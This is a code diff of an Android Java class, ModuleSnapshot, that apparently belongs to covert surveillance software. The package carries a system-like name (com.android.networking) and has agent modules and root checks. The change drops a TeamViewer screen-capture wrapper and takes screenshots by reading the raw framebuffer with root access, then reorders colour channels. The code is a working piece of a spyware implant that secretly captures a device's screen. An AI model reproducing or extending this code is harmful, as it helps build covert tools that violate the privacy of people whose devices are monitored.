@@ -36,7 +36,6 @@ import com.android.networking.listener.ListenerStandby;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.WChar;
-import com.teamviewer.teamviewerlib.ScreenCap.JNICaptureScreenWrapper;
 
 /**
  * The Class SnapshotAgent.
@@ -64,19 +63,6 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private int type;
 	private int quality;
 	Semaphore working = new Semaphore(1, true);
-	JNICaptureScreenWrapper jni;
-
-	/**
-	 * Instantiates a new snapshot agent.
-	 */
-	public ModuleSnapshot() {
-		jni = new JNICaptureScreenWrapper(this);
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " SnapshotAgent constructor, jni:" + jni);//$NON-NLS-1$
-		}
-
-	}
 
 	/*
 	 * (non-Javadoc)
@@ -86,7 +72,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	@Override
 	public boolean parse(ConfModule conf) {
 
-		if (jni == null && !Status.self().haveRoot()) {
+		if ( !Status.self().haveRoot() ) {
 			return false;
 		}
 
@@ -172,55 +158,49 @@ public class ModuleSnapshot extends BaseInstantModule {
 			}
 
 			Bitmap bitmap;
-			if (jni != null) {
 
-				jni.init();
-				bitmap = jni.getBitmap();
+			// 0: invertito blu e rosso
+			// 1: perdita info
+			// 2: invertito blu e verde
+			// 3: no ARGB, no ABGR, no AGRB
+			byte[] raw = getRawBitmap();
+
+			if (raw == null || raw.length == 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart): raw bitmap is null or has 0 length"); //$NON-NLS-1$
+				}
+
 			} else {
 
-				// 0: invertito blu e rosso
-				// 1: perdita info
-				// 2: invertito blu e verde
-				// 3: no ARGB, no ABGR, no AGRB
-				byte[] raw = getRawBitmap();
+				if (usesInvertedColors()) {
+					// sul tablet non e' ARGB ma ABGR.
+					byte[] newraw = new byte[raw.length / 2];
 
-				if (raw == null || raw.length == 0) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (actualStart): raw bitmap is null or has 0 length"); //$NON-NLS-1$
-					}
-
-				} else {
-
-					if (usesInvertedColors()) {
-						// sul tablet non e' ARGB ma ABGR.
-						byte[] newraw = new byte[raw.length / 2];
-
-						for (int i = 0; i < newraw.length; i++) {
-							switch (i % 4) {
-							case 0:
-								newraw[i] = raw[i + 2]; // A 3:+2
-								break;
-							case 1:
-								newraw[i] = raw[i]; // R 1:+2 2:+1
-								break;
-							case 2:
-								newraw[i] = raw[i - 2]; // G 2:-1 3:-2
-								break;
-							case 3:
-								newraw[i] = raw[i]; // B 1:-2
-								break;
-							}
-							/*
-							 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
-							 * else if (i % 4 == 1) newraw[i] = raw[i]; // R
-							 * 1:+2 2:+1 else if (i % 4 == 2) newraw[i] = raw[i
-							 * - 2]; // G 2:-1 3:-2 else if (i % 4 == 3)
-							 * newraw[i] = raw[i]; // B 1:-2
-							 */
+					for (int i = 0; i < newraw.length; i++) {
+						switch (i % 4) {
+						case 0:
+							newraw[i] = raw[i + 2]; // A 3:+2
+							break;
+						case 1:
+							newraw[i] = raw[i]; // R 1:+2 2:+1
+							break;
+						case 2:
+							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+							break;
+						case 3:
+							newraw[i] = raw[i]; // B 1:-2
+							break;
 						}
-
-						raw = newraw;
+						/*
+						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
+						 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
+						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
+						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
+						 * // B 1:-2
+						 */
 					}
+
+					raw = newraw;
 				}
 
 				if (raw != null) {
